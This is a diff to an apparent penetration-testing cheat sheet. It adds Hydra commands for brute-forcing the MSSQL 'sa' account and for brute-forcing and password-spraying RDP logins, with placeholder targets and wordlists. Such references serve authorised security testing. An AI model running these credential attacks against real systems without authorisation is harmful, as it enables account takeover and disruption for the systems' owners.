@@ -64,6 +64,11 @@ hydra -L <userlist> -P <passlist> <ip> smb
 ```
 hydra -L <userlist> -P <passlist> <ip> mysql 
 ```
+## Hydra - mssql - 1433
+#protocol/mssql #port/1433 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
+```
+hydra -l sa -P <passlist> <ip> -s <port|1433> mssql
+```
 
 ## Hydra - vnc - 5900
 #protocol/vnc #port/5900 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
@@ -86,3 +91,20 @@ hydra -L <userlist> -P <passlist> <ip> postgres
 hydra -L <userlist> -P <passlist> <ip> telnet 
 ```
 
+## bruteforce RDP with userlist and password list
+#plateform/linux #target/remote #protocol/rdp #port/3389 #cat/ATTACK/BRUTEFORCE-SPRAY 
+```bash
+hydra -L <userlist> -P <passlist> rdp://<ip>
+```
+
+## bruteforce RDP with user and password list
+#plateform/linux #target/remote #protocol/rdp #port/3389 #cat/ATTACK/BRUTEFORCE-SPRAY 
+```bash
+hydra -l <user> -P <passlist> rdp://<ip>
+```
+
+## RDP password spray
+#plateform/linux #target/remote #protocol/rdp #port/3389 #cat/ATTACK/BRUTEFORCE-SPRAY 
+```bash
+hydra -L <userlist> -p <password> rdp://<ip>
+```
